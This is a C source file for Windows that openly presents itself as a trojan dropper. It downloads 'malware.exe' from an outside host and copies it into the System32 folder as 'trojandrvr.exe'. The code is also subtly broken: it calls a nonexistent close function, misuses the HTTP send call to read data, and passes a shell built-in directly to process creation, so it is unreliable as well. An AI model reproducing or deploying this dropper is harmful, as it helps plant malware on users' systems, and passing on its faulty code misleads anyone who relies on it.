#include <windows.h>
#include <stdio.h>

void downloadFile(char* url, char* localPath) {
    // This function downloads file from given URL to local path

    HINTERNET hSession = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("Failed to open internet session.\n");
        return;
    }

    HINTERNET hConnect = InternetConnect(hSession, "www.example.com", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (hConnect == NULL) {
        printf("Failed to connect to server.\n");
        InternetCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", url, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 1);
    if (hRequest == NULL) {
        printf("Failed to open request.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    char buffer[4096];
    DWORD bytesRead;

    if (!HttpSendRequest(hRequest, NULL, 0, buffer, 0)) {
        printf("Failed to send HTTP request.\n");
        HttpCloseRequestHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    FILE* file = fopen(localPath, "wb");
    if (file == NULL) {
        printf("Failed to open local file for writing.\n");
        HttpCloseRequestHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }

    do {
        HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &bytesRead, NULL, NULL);

        if (HttpSendRequest(hRequest, NULL, 0, buffer, sizeof(buffer)) != TRUE) {
            printf("Failed to send HTTP request.\n");
            fclose(file);
            HttpCloseRequestHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            return;
        }

        fwrite(buffer, bytesRead, 1, file);

    } while (bytesRead == sizeof(buffer));

    fclose(file);
    printf("File downloaded successfully.\n");

    HttpCloseRequestHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

void dropTrojan(char* localPath) {
    // This function drops the trojan malware into system

    char command[512];
    sprintf(command, "copy \"%s\" %s", localPath, "%windir%\\System32\\trojandrvr.exe");

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

int main() {
    downloadFile("http://www.example.com/malware.exe", "malware.exe");

    dropTrojan("malware.exe");

    printf("Malware has been downloaded and dropped.\n");
}
